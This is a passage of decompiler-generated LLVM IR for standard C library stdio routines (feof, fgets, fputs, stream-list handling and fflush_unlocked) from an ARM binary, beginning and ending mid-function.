  store i32 %v1_11f3c, i32* @r0, align 4
  %v2_11f40 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_11f40, i32* @r1, align 4
  %v0_11f44 = call i32 @memcpy()
  store i32 %v0_11f44, i32* %r0.global-to-local, align 4
  %v0_11f48.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_11f48

dec_label_pc_11f48:                               ; preds = %dec_label_pc_11f18, %dec_label_pc_11f30
  %v2_11f64 = phi i32 [ %v0_11f48.pre, %dec_label_pc_11f30 ], [ %v0_11f18, %dec_label_pc_11f18 ]
  %v1_11f48 = add i32 %v2_11f64, 16
  %v2_11f48 = inttoptr i32 %v1_11f48 to i32*
  %v3_11f48 = load i32, i32* %v2_11f48, align 4
  store i32 %v3_11f48, i32* %r3.global-to-local, align 4
  %v1_11f4c = and i32 %v3_11f48, 128
  %v2_11f4c = icmp eq i32 %v1_11f4c, 0
  br i1 %v2_11f4c, label %.thread46, label %.thread44

.thread44:                                        ; preds = %dec_label_pc_11f48
  store i32 %v2_11af0, i32* %r3.global-to-local, align 4
  %v2_11f54 = inttoptr i32 %v2_11f64 to i32*
  %v3_11f54 = load i32, i32* %v2_11f54, align 4
  %v2_11f5c.pre = load i32, i32* %r6.global-to-local, align 4
  %v3_11f5c = sub i32 %v2_11f5c.pre, %v2_11af0
  store i32 %v3_11f5c, i32* %r3.global-to-local, align 4
  %v5_11f60 = mul i32 %v3_11f5c, 4
  %v6_11f60 = add i32 %v5_11f60, %v3_11f54
  store i32 %v6_11f60, i32* @r2, align 4
  br label %bb146

.thread46:                                        ; preds = %dec_label_pc_11f48
  %v1_11f5841 = load i32, i32* %r6.global-to-local, align 4
  %v2_11f5842 = add i32 %v1_11f5841, 1
  store i32 %v2_11f5842, i32* %r3.global-to-local, align 4
  %v3_11f64 = inttoptr i32 %v2_11f64 to i32*
  store i32 %v2_11f5842, i32* %v3_11f64, align 4
  %v0_11f68.pre = load i32, i32* %r7.global-to-local, align 4
  br label %bb146

bb146:                                            ; preds = %.thread44, %.thread46
  %v1_11f70 = phi i32 [ %v2_11f64, %.thread44 ], [ %v0_11f68.pre, %.thread46 ]
  %v1_11f68 = add i32 %v1_11f70, 28
  %v2_11f68 = inttoptr i32 %v1_11f68 to i32*
  %v3_11f68 = load i32, i32* %v2_11f68, align 4
  store i32 %v3_11f68, i32* %r3.global-to-local, align 4
  %v1_11f6c = add i32 %v3_11f68, 2
  store i32 %v1_11f6c, i32* %r0.global-to-local, align 4
  %v0_11f70 = load i32, i32* %sb.global-to-local, align 4
  %v2_11f70 = add i32 %v1_11f70, 24
  %v3_11f70 = inttoptr i32 %v2_11f70 to i32*
  store i32 %v0_11f70, i32* %v3_11f70, align 4
  br i1 %v2_11f4c, label %dec_label_pc_11f80, label %bb147

bb147:                                            ; preds = %bb146
  %v1_11f74 = load i32, i32* @r2, align 4
  %v2_11f74 = load i32, i32* %r7.global-to-local, align 4
  %v3_11f74 = inttoptr i32 %v2_11f74 to i32*
  store i32 %v1_11f74, i32* %v3_11f74, align 4
  br label %dec_label_pc_11f80

dec_label_pc_11f7c:                               ; preds = %dec_label_pc_11b38, %dec_label_pc_11c44, %dec_label_pc_11cf4, %dec_label_pc_11cc8, %dec_label_pc_11cd4, %dec_label_pc_11c14, %dec_label_pc_11eb4, %dec_label_pc_11e60, %.thread25
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_11f80

dec_label_pc_11f80:                               ; preds = %bb147, %bb146, %dec_label_pc_11f7c
  %v2_11f84 = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_11f84, i32* @r4, align 4
  store i32 %v6_11ae8, i32* @r5, align 4
  %v26_11f84 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v26_11f84

; uselistorder directives
  uselistorder i32 %v3_11f5c, { 1, 0 }
  uselistorder i32 %v1_11f1c, { 1, 2, 0 }
  uselistorder i32 %v0_11ed0, { 1, 2, 0 }
  uselistorder i32 %v2_11eac, { 1, 0 }
  uselistorder i32 %v1_11eac, { 1, 0, 2 }
  uselistorder i32 %v0_11ecc, { 3, 4, 5, 0, 7, 6, 9, 1, 2, 8, 10 }
  uselistorder i32 %v1_11e10, { 1, 2, 0 }
  uselistorder i32 %v3_11df8, { 1, 0 }
  uselistorder i32 %v3_11df0, { 1, 0 }
  uselistorder i32 %v2_11dd0, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_11db8, { 0, 2, 3, 1 }
  uselistorder i32 %v1_11d9c, { 1, 0, 2 }
  uselistorder i32 %v3_11d7c, { 2, 1, 0 }
  uselistorder i32 %v1_11d40, { 0, 2, 3, 1 }
  uselistorder i32 %v2_11d14, { 1, 0 }
  uselistorder i32 %v5_11c74, { 0, 1, 3, 2 }
  uselistorder i32 %v0_11c74, { 1, 0 }
  uselistorder i32 %storemerge105, { 1, 0, 4, 5, 2, 3 }
  uselistorder i32 %stack_var_-48.2, { 1, 0 }
  uselistorder i32 %v2_11c20, { 1, 0 }
  uselistorder i32 %v0_11c3c, { 3, 2, 0, 1, 4 }
  uselistorder i32 %v0_11c04, { 2, 3, 4, 6, 0, 1, 5, 7 }
  uselistorder i32 %., { 1, 0 }
  uselistorder i32 %v0_11bec, { 2, 3, 4, 5, 0, 1, 6 }
  uselistorder i32 %v3_11bd8, { 1, 2, 0 }
  uselistorder i32 %v0_11c50, { 1, 2, 3, 0, 4, 7, 5, 6 }
  uselistorder i32 %stack_var_-48.1, { 1, 2, 3, 0 }
  uselistorder i32 %v0_11b8c, { 1, 0 }
  uselistorder i32 %v1_11b5c, { 0, 2, 1 }
  uselistorder i32 %v25_11ae8, { 0, 8, 1, 9, 2, 7, 3, 10, 4, 5, 6 }
  uselistorder i32* %stack_var_-32, { 0, 2, 1 }
  uselistorder i32* %stack_var_-36, { 2, 0, 1 }
  uselistorder i32 %tmp, { 0, 3, 2, 1, 4 }
  uselistorder i32* %sb.global-to-local, { 4, 0, 5, 6, 7, 1, 2, 3, 8, 9 }
  uselistorder i32* %r8.global-to-local, { 0, 1, 3, 2, 4, 7, 6, 5, 8 }
  uselistorder i32* %r7.global-to-local, { 2, 1, 0, 3, 7, 4, 16, 5, 6, 8, 9, 10, 11, 12, 13, 14, 15, 17, 18 }
  uselistorder i32* %r6.global-to-local, { 10, 9, 12, 14, 0, 2, 13, 3, 4, 5, 7, 8, 15, 6, 1, 11 }
  uselistorder i32* %r3.global-to-local, { 3, 0, 11, 4, 5, 6, 7, 8, 9, 10, 12, 13, 14, 15, 17, 16, 1, 2, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 31, 30, 32, 33, 34, 35, 36, 37, 38, 41, 42, 43, 39, 40, 44, 45, 46, 47, 48, 49, 50 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 13, 12, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 13, 14, 15, 11, 12, 0, 16 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 1, 4, 6, 5, 7, 8, 9, 10, 11, 12, 23, 22, 13, 25, 14, 15, 16, 26, 17, 27, 18, 28, 19, 20, 21, 24, 0 }
  uselistorder i32* %ip.global-to-local, { 0, 2, 1, 3, 4, 5, 6, 8, 7 }
  uselistorder i32 38, { 6, 0, 1, 2, 3, 4, 5 }
  uselistorder i32 ()* @_promoted_size, { 1, 0 }
  uselistorder i32 3840, { 4, 5, 6, 2, 3, 0, 1 }
  uselistorder i32 ptrtoint (i32* @global_var_1ca50.624 to i32), { 1, 0, 2 }
  uselistorder i32 ptrtoint (i32* @global_var_1ca60.622 to i32), { 1, 0, 2 }
  uselistorder i32 ptrtoint ([21 x i8]* @global_var_1ca7c.616 to i32), { 2, 1, 3, 0, 4 }
  uselistorder i32 ptrtoint ([9 x i8]* @global_var_1ca3c.614 to i32), { 1, 0, 2 }
  uselistorder i8 109, { 1, 0 }
  uselistorder i8 36, { 1, 0 }
  uselistorder i8 37, { 2, 3, 4, 1, 5, 0 }
  uselistorder label %dec_label_pc_11f80, { 2, 0, 1 }
  uselistorder label %dec_label_pc_11f7c, { 6, 7, 8, 2, 4, 3, 1, 5, 0 }
  uselistorder label %bb146, { 1, 0 }
  uselistorder label %dec_label_pc_11f48, { 1, 0 }
  uselistorder label %dec_label_pc_11f18, { 2, 0, 1 }
  uselistorder label %dec_label_pc_11f04, { 0, 2, 1 }
  uselistorder label %dec_label_pc_11ec0, { 1, 0 }
  uselistorder label %bb144, { 1, 0 }
  uselistorder label %dec_label_pc_11e78, { 1, 0 }
  uselistorder label %bb137, { 2, 1, 0 }
  uselistorder label %.thread25, { 2, 0, 1 }
  uselistorder label %dec_label_pc_11d2c, { 1, 0 }
  uselistorder label %dec_label_pc_11d04, { 1, 0 }
  uselistorder label %dec_label_pc_11cb4, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_11c34, { 2, 0, 1 }
  uselistorder label %dec_label_pc_11c30, { 1, 0 }
  uselistorder label %thread-pre-split, { 1, 0 }
  uselistorder label %.backedge, { 1, 0, 2 }
  uselistorder label %dec_label_pc_11b90, { 1, 0 }
  uselistorder label %dec_label_pc_11b80, { 1, 0 }
}

define i32 @feof(i8* %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_11fac = load i32, i32* @r4, align 4
  store i32 %v3_11fac, i32* %stack_var_-16, align 4
  %v6_11fac = load i32, i32* @r5, align 4
  %v9_11fac = load i32, i32* @r6, align 4
  %v2_11fb0 = add i32 %tmp, 52
  %v3_11fb0 = inttoptr i32 %v2_11fb0 to i32*
  %v4_11fb0 = load i32, i32* %v3_11fb0, align 4
  store i32 %v4_11fb0, i32* @r6, align 4
  %v2_11fb4 = add i32 %tmp, 56
  store i32 %v2_11fb4, i32* @r5, align 4
  %v2_11fb8 = ptrtoint i32* %stack_var_-32 to i32
  %v2_11fbc = icmp eq i32 %v4_11fb0, 0
  store i32 %tmp, i32* @r4, align 4
  store i32 ptrtoint (i8* @global_var_f360.273 to i32), i32* @r1, align 4
  store i32 %v2_11fb4, i32* @r2, align 4
  store i32 %v2_11fb8, i32* @r0, align 4
  br i1 %v2_11fbc, label %dec_label_pc_11fd4, label %dec_label_pc_11ff0

dec_label_pc_11fd4:                               ; preds = %entry
  %v1_11fdc = call i32 @__pthread_cleanup_push_defer()
  %v0_11fe0 = load i32, i32* @r5, align 4
  %v2_11fec = call i32 @pthread_mutex_lock(i32 %v0_11fe0)
  %v0_11ff0.pre = load i32, i32* @r4, align 4
  %v0_11ff8.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_11ff0

dec_label_pc_11ff0:                               ; preds = %entry, %dec_label_pc_11fd4
  %v0_11ff8 = phi i32 [ %v4_11fb0, %entry ], [ %v0_11ff8.pre, %dec_label_pc_11fd4 ]
  %v0_11ff0 = phi i32 [ %tmp, %entry ], [ %v0_11ff0.pre, %dec_label_pc_11fd4 ]
  %v1_11ff0 = add i32 %v0_11ff0, 1
  %v2_11ff0 = inttoptr i32 %v1_11ff0 to i8*
  %v3_11ff0 = load i8, i8* %v2_11ff0, align 1
  %v4_11ff0 = zext i8 %v3_11ff0 to i32
  %v1_11ff4 = inttoptr i32 %v0_11ff0 to i8*
  %v2_11ff4 = load i8, i8* %v1_11ff4, align 1
  %v3_11ff4 = zext i8 %v2_11ff4 to i32
  %v2_11ff8 = icmp eq i32 %v0_11ff8, 0
  %v4_12004 = mul nuw nsw i32 %v4_11ff0, 256
  %v5_12004 = or i32 %v3_11ff4, %v4_12004
  store i32 %v5_12004, i32* %r4.global-to-local, align 4
  br i1 %v2_11ff8, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_11ff0
  call void @__pseudo_branch(i32 58236)
  %v0_12014.pre = load i32, i32* %r4.global-to-local, align 4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_11ff0, %bb
  %v0_12014 = phi i32 [ %v5_12004, %dec_label_pc_11ff0 ], [ %v0_12014.pre, %bb ]
  %v1_12014 = and i32 %v0_12014, 4
  %v2_1201c = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_1201c, i32* @r4, align 4
  store i32 %v6_11fac, i32* @r5, align 4
  store i32 %v9_11fac, i32* @r6, align 4
  ret i32 %v1_12014

; uselistorder directives
  uselistorder i32 %v0_11ff0, { 1, 0 }
  uselistorder i32 %tmp, { 0, 1, 3, 2 }
  uselistorder label %.thread1, { 1, 0 }
  uselistorder label %dec_label_pc_11ff0, { 1, 0 }
}

define i32 @fgets(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_12030 = load i32, i32* @r4, align 4
  store i32 %v3_12030, i32* %stack_var_-24, align 4
  %v6_12030 = load i32, i32* @r5, align 4
  %v9_12030 = load i32, i32* @r6, align 4
  %v12_12030 = load i32, i32* @r7, align 4
  %v1_12034 = add i32 %arg3, 52
  %v2_12034 = inttoptr i32 %v1_12034 to i32*
  %v3_12034 = load i32, i32* %v2_12034, align 4
  store i32 %v3_12034, i32* %r8.global-to-local, align 4
  %v2_12038 = ptrtoint i32* %stack_var_-40 to i32
  %v1_1203c = add i32 %arg3, 56
  store i32 %v1_1203c, i32* @r5, align 4
  %v2_12040 = icmp eq i32 %v3_12034, 0
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg1, i32* @r7, align 4
  store i32 %arg2, i32* @r6, align 4
  store i32 %v1_1203c, i32* @r2, align 4
  store i32 %v2_12038, i32* @r0, align 4
  store i32 ptrtoint (i8* @global_var_f360.273 to i32), i32* @r1, align 4
  br i1 %v2_12040, label %dec_label_pc_12060, label %dec_label_pc_1207c

dec_label_pc_12060:                               ; preds = %entry
  %v1_12068 = call i32 @__pthread_cleanup_push_defer()
  %v0_1206c = load i32, i32* @r5, align 4
  store i32 73852, i32* @lr, align 4
  %v2_12078 = call i32 @pthread_mutex_lock(i32 %v0_1206c)
  %v0_1207c.pre = load i32, i32* @r6, align 4
  %v0_12080.pre = load i32, i32* @r4, align 4
  %v0_12084.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_1207c

dec_label_pc_1207c:                               ; preds = %entry, %dec_label_pc_12060
  %v0_12084 = phi i32 [ %arg1, %entry ], [ %v0_12084.pre, %dec_label_pc_12060 ]
  %v0_12080 = phi i32 [ %arg3, %entry ], [ %v0_12080.pre, %dec_label_pc_12060 ]
  %v0_1207c = phi i32 [ %arg2, %entry ], [ %v0_1207c.pre, %dec_label_pc_12060 ]
  %v3_12088 = inttoptr i32 %v0_12084 to i8*
  %v4_12088 = call i32 @__GI_fgets_unlocked(i8* %v3_12088, i32 %v0_1207c, i32 %v0_12080)
  %v0_1208c = load i32, i32* %r8.global-to-local, align 4
  %v2_1208c = icmp eq i32 %v0_1208c, 0
  store i32 %v4_12088, i32* %r4.global-to-local, align 4
  br i1 %v2_1208c, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_1207c
  store i32 73896, i32* @lr, align 4
  call void @__pseudo_branch(i32 58236)
  %v0_120a8.pre = load i32, i32* %r4.global-to-local, align 4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_1207c, %bb
  %v0_120a8 = phi i32 [ %v4_12088, %dec_label_pc_1207c ], [ %v0_120a8.pre, %bb ]
  %v2_120b0 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_120b0, i32* @r4, align 4
  store i32 %v6_12030, i32* @r5, align 4
  store i32 %v9_12030, i32* @r6, align 4
  store i32 %v12_12030, i32* @r7, align 4
  ret i32 %v0_120a8

; uselistorder directives
  uselistorder i32 %arg3, { 0, 1, 3, 2 }
  uselistorder label %.thread1, { 1, 0 }
  uselistorder label %dec_label_pc_1207c, { 1, 0 }
}

define i32 @__GI_fputs(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_120c4 = load i32, i32* @r4, align 4
  store i32 %v3_120c4, i32* %stack_var_-20, align 4
  %v6_120c4 = load i32, i32* @r5, align 4
  %v9_120c4 = load i32, i32* @r6, align 4
  %v12_120c4 = load i32, i32* @r7, align 4
  %v1_120c8 = add i32 %arg2, 52
  %v2_120c8 = inttoptr i32 %v1_120c8 to i32*
  %v3_120c8 = load i32, i32* %v2_120c8, align 4
  store i32 %v3_120c8, i32* @r7, align 4
  %v1_120cc = add i32 %arg2, 56
  store i32 %v1_120cc, i32* @r5, align 4
  %v2_120d0 = ptrtoint i32* %stack_var_-36 to i32
  %v2_120d4 = icmp eq i32 %v3_120c8, 0
  store i32 %arg2, i32* @r4, align 4
  store i32 %arg1, i32* @r6, align 4
  store i32 %v1_120cc, i32* @r2, align 4
  store i32 ptrtoint (i8* @global_var_f360.273 to i32), i32* @r1, align 4
  store i32 %v2_120d0, i32* @r0, align 4
  br i1 %v2_120d4, label %dec_label_pc_120f0, label %dec_label_pc_1210c

dec_label_pc_120f0:                               ; preds = %entry
  %v1_120f8 = call i32 @__pthread_cleanup_push_defer()
  %v0_120fc = load i32, i32* @r5, align 4
  store i32 73996, i32* @lr, align 4
  %v2_12108 = call i32 @pthread_mutex_lock(i32 %v0_120fc)
  %v0_1210c.pre = load i32, i32* @r4, align 4
  %v0_12110.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_1210c

dec_label_pc_1210c:                               ; preds = %entry, %dec_label_pc_120f0
  %v0_12110 = phi i32 [ %arg1, %entry ], [ %v0_12110.pre, %dec_label_pc_120f0 ]
  %v0_1210c = phi i32 [ %arg2, %entry ], [ %v0_1210c.pre, %dec_label_pc_120f0 ]
  %v2_12114 = inttoptr i32 %v0_12110 to i8*
  %v3_12114 = call i32 @__GI_fputs_unlocked(i8* %v2_12114, i32 %v0_1210c)
  %v0_12118 = load i32, i32* @r7, align 4
  %v2_12118 = icmp eq i32 %v0_12118, 0
  store i1 %v2_12118, i1* @cpsr_z, align 1
  store i32 %v3_12114, i32* %r4.global-to-local, align 4
  br i1 %v2_12118, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_1210c
  store i32 74036, i32* @lr, align 4
  call void @__pseudo_branch(i32 58236)
  %v0_12134.pre = load i32, i32* %r4.global-to-local, align 4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_1210c, %bb
  %v0_12134 = phi i32 [ %v3_12114, %dec_label_pc_1210c ], [ %v0_12134.pre, %bb ]
  %v2_1213c = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_1213c, i32* @r4, align 4
  store i32 %v6_120c4, i32* @r5, align 4
  store i32 %v9_120c4, i32* @r6, align 4
  store i32 %v12_120c4, i32* @r7, align 4
  ret i32 %v0_12134

; uselistorder directives
  uselistorder i32 (i8*, i32)* @__GI_fputs_unlocked, { 1, 0 }
  uselistorder i32 %arg2, { 0, 1, 3, 2 }
  uselistorder label %.thread1, { 1, 0 }
  uselistorder label %dec_label_pc_1210c, { 1, 0 }
}

define i32 @_stdio_openlist_dec_use(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %v6_12150 = load i32, i32* @r5, align 4
  %v2_12154 = ptrtoint i32* %stack_var_-48 to i32
  %v2_12158 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_12158, i32* @r0, align 4
  store i32 ptrtoint (i8* @global_var_f360.273 to i32), i32* @r1, align 4
  store i32 ptrtoint (i32* @global_var_2a8b8.557 to i32), i32* @r2, align 4
  store i32 58060, i32* @r4, align 4
  %v1_1216c = call i32 @__pthread_cleanup_push_defer()
  store i32 62768, i32* @r5, align 4
  %v2_1217c = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_2a8b8.557 to i32))
  %v2_12184 = load i32, i32* @global_var_2d1d0.559, align 4
  %v7_12188 = icmp eq i32 %v2_12184, 1
  br i1 %v7_12188, label %dec_label_pc_12190, label %dec_label_pc_1223c

dec_label_pc_12190:                               ; preds = %entry
  %v2_12194 = load i32, i32* @global_var_2d1d4.564, align 4
  %tmp19 = icmp slt i32 %v2_12194, 1
  br i1 %tmp19, label %dec_label_pc_1223c, label %dec_label_pc_121a0

dec_label_pc_121a0:                               ; preds = %dec_label_pc_12190
  store i32 %v2_12154, i32* @r0, align 4
  store i32 ptrtoint (i8* @global_var_f360.273 to i32), i32* @r1, align 4
  store i32 ptrtoint (i32* @global_var_2a8a0.575 to i32), i32* @r2, align 4
  %v1_121b0 = call i32 @__pthread_cleanup_push_defer()
  %v2_121bc = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_2a8a0.575 to i32))
  %v2_121c4 = load i32, i32* bitcast (i32** @global_var_2a89c.382 to i32*), align 4
  store i32 %v2_121c4, i32* @r4, align 4
  store i32 0, i32* @r6, align 4
  %v2_122143 = icmp eq i32 %v2_121c4, 0
  br i1 %v2_122143, label %dec_label_pc_12220, label %dec_label_pc_121d0

dec_label_pc_121d0:                               ; preds = %dec_label_pc_121a0, %dec_label_pc_12210
  %v1_121e8 = phi i32 [ %v0_12210, %dec_label_pc_12210 ], [ %v2_121c4, %dec_label_pc_121a0 ]
  %v1_121d0 = inttoptr i32 %v1_121e8 to i8*
  %v2_121d0 = load i8, i8* %v1_121d0, align 1
  %v3_121d0 = zext i8 %v2_121d0 to i32
  %v1_121d4 = add i32 %v1_121e8, 1
  %v2_121d4 = inttoptr i32 %v1_121d4 to i8*
  %v3_121d4 = load i8, i8* %v2_121d4, align 1
  %v4_121d4 = zext i8 %v3_121d4 to i32
  %v4_121d8 = mul nuw nsw i32 %v4_121d4, 256
  %v5_121d8 = or i32 %v4_121d8, %v3_121d0
  %v2_121dc = and i32 %v5_121d8, 32816
  %v7_121e0 = icmp eq i32 %v2_121dc, 48
  %v1_121e4 = add i32 %v1_121e8, 32
  %v2_121e4 = inttoptr i32 %v1_121e4 to i32*
  %v3_121e4 = load i32, i32* %v2_121e4, align 4
  store i32 %v3_121e4, i32* @r5, align 4
  br i1 %v7_121e0, label %dec_label_pc_121f0, label %.thread12

.thread12:                                        ; preds = %dec_label_pc_121d0
  store i32 %v1_121e8, i32* @r6, align 4
  br label %dec_label_pc_12210

dec_label_pc_121f0:                               ; preds = %dec_label_pc_121d0
  %v0_121f0 = load i32, i32* @r6, align 4
  %v2_121f0 = icmp eq i32 %v0_121f0, 0
  br i1 %v2_121f0, label %.thread1, label %.thread

.thread:                                          ; preds = %dec_label_pc_121f0
  %v3_121f8 = add i32 %v0_121f0, 32
  %v4_121f8 = inttoptr i32 %v3_121f8 to i32*
  store i32 %v3_121e4, i32* %v4_121f8, align 4
  %v0_12200.pre = load i32, i32* @r4, align 4
  br label %bb

.thread1:                                         ; preds = %dec_label_pc_121f0
  store i32 %v3_121e4, i32* bitcast (i32** @global_var_2a89c.382 to i32*), align 4
  br label %bb

bb:                                               ; preds = %.thread, %.thread1
  %v0_12200 = phi i32 [ %v0_12200.pre, %.thread ], [ %v1_121e8, %.thread1 ]
  %v1_12200 = add i32 %v0_12200, 1
  %v2_12200 = inttoptr i32 %v1_12200 to i8*
  %v3_12200 = load i8, i8* %v2_12200, align 1
  %v1_12204 = and i8 %v3_12200, 32
  %v1_1220c = icmp ne i8 %v1_12204, 0
  call void @__pseudo_cond_branch(i1 %v1_1220c, i32 ptrtoint (i32* @global_var_134b0.561 to i32))
  %v0_12210.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_12210

dec_label_pc_12210:                               ; preds = %.thread12, %bb
  %v0_12210 = phi i32 [ %v0_12210.pre, %bb ], [ %v3_121e4, %.thread12 ]
  store i32 %v0_12210, i32* @r4, align 4
  %v2_12214 = icmp eq i32 %v0_12210, 0
  br i1 %v2_12214, label %dec_label_pc_12220, label %dec_label_pc_121d0

dec_label_pc_12220:                               ; preds = %dec_label_pc_12210, %dec_label_pc_121a0
  store i32 %v2_12154, i32* @r0, align 4
  store i32 1, i32* @r1, align 4
  store i32 74292, i32* @lr, align 4
  %v1_12230 = call i32 @__pthread_cleanup_pop_restore()
  %v0_12238 = load i32, i32* @r4, align 4
  store i32 %v0_12238, i32* @global_var_2d1d4.564, align 4
  %v2_12240.pre = load i32, i32* @global_var_2d1d0.559, align 4
  br label %dec_label_pc_1223c

dec_label_pc_1223c:                               ; preds = %entry, %dec_label_pc_12190, %dec_label_pc_12220
  %v2_12240 = phi i32 [ %v2_12184, %entry ], [ 1, %dec_label_pc_12190 ], [ %v2_12240.pre, %dec_label_pc_12220 ]
  %v1_12244 = add i32 %v2_12240, -1
  store i32 %v1_12244, i32* @global_var_2d1d0.559, align 4
  store i32 %v2_12158, i32* @r0, align 4
  store i32 1, i32* @r1, align 4
  store i32 74336, i32* @lr, align 4
  %v1_1225c = call i32 @__pthread_cleanup_pop_restore()
  store i32 %v6_12150, i32* @r5, align 4
  ret i32 %v1_1225c

; uselistorder directives
  uselistorder i32 %v0_12210, { 2, 1, 0 }
  uselistorder i32 %v3_121e4, { 1, 0, 2, 3 }
  uselistorder i32 %v1_121e8, { 0, 1, 2, 4, 3 }
  uselistorder i32* @global_var_2d1d4.564, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_1223c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_12210, { 1, 0 }
  uselistorder label %bb, { 1, 0 }
  uselistorder label %dec_label_pc_121d0, { 1, 0 }
}

define i32 @fflush_unlocked(i8* %arg1) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %stack_var_-44 = alloca i32, align 4
  %v3_12290 = load i32, i32* @r4, align 4
  %v6_12290 = load i32, i32* @r5, align 4
  %v15_12290 = load i32, i32* @r8, align 4
  store i32 ptrtoint (i32** @global_var_2a89c.382 to i32), i32* %r3.global-to-local, align 4
  %v10_12298 = icmp eq i8* %arg1, bitcast (i32** @global_var_2a89c.382 to i8*)
  store i1 %v10_12298, i1* %cpsr_z.global-to-local, align 1
  %.v1_1229c = select i1 %v10_12298, i32 0, i32 %tmp
  store i32 %.v1_1229c, i32* @r8, align 4
  %v2_122a4 = ptrtoint i32* %stack_var_-44 to i32
  br i1 %v10_12298, label %bb, label %dec_label_pc_122b0

bb:                                               ; preds = %entry
  store i32 %.v1_1229c, i32* @sl, align 4
  br label %dec_label_pc_122bc

dec_label_pc_122b0:                               ; preds = %entry
  %v2_122b0 = icmp eq i32 %.v1_1229c, 0
  store i1 %v2_122b0, i1* %cpsr_z.global-to-local, align 1
  store i32 256, i32* @sl, align 4
  br i1 %v2_122b0, label %dec_label_pc_122bc, label %dec_label_pc_12408

dec_label_pc_122bc:                               ; preds = %bb, %dec_label_pc_122b0
  store i32 ptrtoint (i32* @global_var_2a8b8.557 to i32), i32* @r2, align 4
  store i32 ptrtoint (i8* @global_var_f360.273 to i32), i32* @r1, align 4
  store i32 %v2_122a4, i32* @r0, align 4
  %v1_122d0 = call i32 @__pthread_cleanup_push_defer()
  store i32 62768, i32* @r7, align 4
  store i32 ptrtoint (i32* @global_var_2a8b8.557 to i32), i32* %r0.global-to-local, align 4
  %v2_122e0 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_2a8b8.557 to i32))
  %v2_122e8 = load i32, i32* @global_var_2d1d0.559, align 4
  %v1_122ec = add i32 %v2_122e8, 1
  store i32 %v1_122ec, i32* %r3.global-to-local, align 4
  store i32 %v1_122ec, i32* @global_var_2d1d0.559, align 4
  store i32 58236, i32* @r5, align 4
  store i32 1, i32* @r1, align 4
  store i32 %v2_122a4, i32* @r0, align 4
  store i32 74504, i32* @lr, align 4
  %v1_12304 = call i32 @__pthread_cleanup_pop_restore()
  store i32 ptrtoint (i8* @global_var_f360.273 to i32), i32* @r1, align 4
  store i32 ptrtoint (i32* @global_var_2a8a0.575 to i32), i32* @r2, align 4
  store i32 %v2_122a4, i32* @r0, align 4
  %v1_12318 = call i32 @__pthread_cleanup_push_defer()
  store i32 ptrtoint (i32* @global_var_2a8a0.575 to i32), i32* %r0.global-to-local, align 4
  %v2_12324 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_2a8a0.575 to i32))
  store i32 ptrtoint (i32** @global_var_2a89c.382 to i32), i32* %r3.global-to-local, align 4
  store i32 %v2_122a4, i32* @r0, align 4
  store i32 1, i32* @r1, align 4
  %v2_12334 = load i32, i32* bitcast (i32** @global_var_2a89c.382 to i32*), align 4
  store i32 %v2_12334, i32* @r6, align 4
  store i32 74560, i32* @lr, align 4
  %v1_1233c = call i32 @__pthread_cleanup_pop_restore()
  store i32 %v1_1233c, i32* %r0.global-to-local, align 4
  store i32 %v2_122a4, i32* @r4, align 4
  %v0_12344 = load i32, i32* @r8, align 4
  store i32 %v0_12344, i32* @r5, align 4
  %v0_123f8.pr = load i32, i32* @r6, align 4
  %v2_123f825 = icmp eq i32 %v0_123f8.pr, 0
  store i1 %v2_123f825, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_123f825, label %dec_label_pc_12400, label %dec_label_pc_1234c

dec_label_pc_1234c:                               ; preds = %dec_label_pc_122bc, %.thread11
